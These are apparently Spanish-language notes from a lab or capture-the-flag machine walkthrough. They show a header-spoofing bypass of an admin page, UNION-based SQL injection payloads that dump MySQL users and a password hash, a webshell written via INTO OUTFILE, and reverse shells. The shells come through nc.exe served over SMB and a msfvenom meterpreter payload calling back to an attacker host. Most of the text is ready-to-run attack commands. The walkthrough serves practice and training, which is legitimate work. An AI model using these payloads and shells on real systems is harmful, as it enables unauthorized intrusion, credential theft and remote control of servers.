PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
3306/tcp  open  mysql
49666/tcp open  unknown
49667/tcp open  unknown

-Encontramos esto en el código fuente de la página principal
	<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		<!-- Header -->

-Si vamos a /admin.php nos sale el siguiente mensaje:
	-'Access Denied: Header Missing. Please ensure you go through the proxy to access this page'

-Interceptamos la Petición con BurpSuite e introducimos el siguiente parámetro con la URL que vimos en el Código fuente, después le damos a Forward:
	GET /admin.php HTTP/1.1
	Host: 10.10.10.167
	**X-Forwarded-For: 192.168.4.28**
		-Le damos a Forward y estamos dentro

-Una vez dentro, tenemos que hacer todas la Peticiones a través de BurpSuite, ya que sino el Parámetro 'X-Forwarded-For' se pierde

-Interceptamos otra Petición en la Barra de Busqueda de Productos e inyectamos una Comilla Simple:
	POST /search_products.php HTTP/1.1
	Host: 10.10.10.167
	X-Forwarded-For: 192.168.4.28
	productName=test'
		**Error:** SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax;

-Detección Inicial:
	productName=test'-- -
	(Con esto no da Error)

-Averiguamos Cuántas Columnas se están empleando:
	POST /search_products.php HTTP/1.1
	Host: 10.10.10.167
	X-Forwarded-For: 192.168.4.28
	productName=test'order by 6-- - 
		NO da Error, con 7 si da Error, **HAY 6 COLUMNAS**

-Las 6 Columnas son Compatibles con STRINGS:
	productName=test' UNION SELECT 'TEST','TEST','TEST','TEST','TEST','TEST'-- -
		-Todas son Compatibles

## SQLI - DB Enumeration (Mysql)

-Listamos las DBS:
	-productName=test' UNION SELECT schema_name,2,3,4,5,6 FROM information_schema.schemata-- -
		information_schema
		mysql
		warehouse

-Listamos las Tablas de la DB warehouse:
	-productName=test' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema='warehouse'-- -
		product 
		product_category
		product_pack
		(Por aquí **NO VAMOS A LLEGAR A NADA**)

-Listamos las Tablas de la DB 'mysql':
	-productName=test' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema='mysql'-- -
		users

-Listamos las Columnas de la Tabla 'users':
	-productName=test' UNION SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name='user'-- -
		user
		password

-Listamos el Contenido de las Columnas 'user' y 'password':
	-productName=test' UNION SELECT user,password,3,4,5,6 FROM mysql.user-- -
		root:*0A4A5CAD344718DC418035A1F4D292BA603134D8

-**No SIRVE** de nada porque no puedo romper el hash

----------------------------------------------------------------------------------------------------------

-Vamos a intentar derivar el SQLI a RCE

### Comprobación Permisos Usuario

-Primero, Comprobamos que usuario tenemos:
	-productName=test' UNION SELECT user(),2,3,4,5,6-- -
		manager@localhost

-Comprobamos los usuarios que Tienen Permisos de Escritura:
	-productName=test' UNION SELECT user,2,3,4,5,6 FROM mysql.user where File_priv = 'Y'-- -
		root
		**manager (Es Nuestro Usuario!!!)**
		hector

## SQLI to RCE - Into OutFile

-La ruta Por Defecto del Directorio Web en Máquinas Windows es:
	c:/inetpub/wwwroot/

-Subimos una webshell:
	![[Pasted image 20250531134749.png]]

-Ejecutamos Comandos desde la URL:
	-http://10.10.10.167/backdoor.php?cmd=whoami
		1 2 3 4 5 **nt authority\iusr**

-Para **Ganar Acceso** a la Máquina (2 ways):
### 1-Con nc.exe:

-Nos copiamos el Netcat y le damos permisos:
	-cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
	-chmod +x nc.exe
-Iniciamos Servidor con Impacket-smbserver y nos ponemos a la Escucha:
	-impacket-smbserver smb $(pwd) -smb2support  (IMPORTANTE el **-smb2support**)
	-rlwrap nc -lvnp 1234
-Hacemos la Petición desde la URL para conectarnos:
	-http://10.10.10.167/backdoor.php?cmd=\\10.10.14.7\smb\nc.exe 10.10.14.7 1234 -e cmd
		**C:\inetpub\wwwroot>whoami**
			**nt authority\iusr**

NOTA: Si iniciamos el Servidor de la siguiente manera, o sin el parámetro '-smb2support', **NO FUNCIONA**:
	-impacket-smbserver smb . 
	-impacket-smbserver smb $(pwd)
	**(NO FUNCIONAN)**

### 2-Con msfvenom y Mestasploit (Multi/handler)

-Creamos el Payload con msfvenom y le damos Permisos:
	-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o meterpreter.exe
	-chmod +x meterpreter.exe

-Nos ponemos a la Escucha con **impacket-smbserver** y con el **multi/handler (Metasploit)**:
	-impacket-smbserver smb $(pwd) -smb2support  (IMPORTANTE el **-smb2support**)
	-msfconsole --> use multi/handler --> set lhost 10.10.14.7 , set payload windows/meterpreter/reverse_tcp --> run

-Hacemos la Petición desde la URL para conectarnos:
	-http://10.10.10.167/backdoor.php?cmd=\\10.10.14.7\smb\meterpreter.exe
		**meterpreter > getuid**
			**Server username: NT AUTHORITY\IUSR**


## Escalada de Privilegios

-La escalada de sale del SCOPE


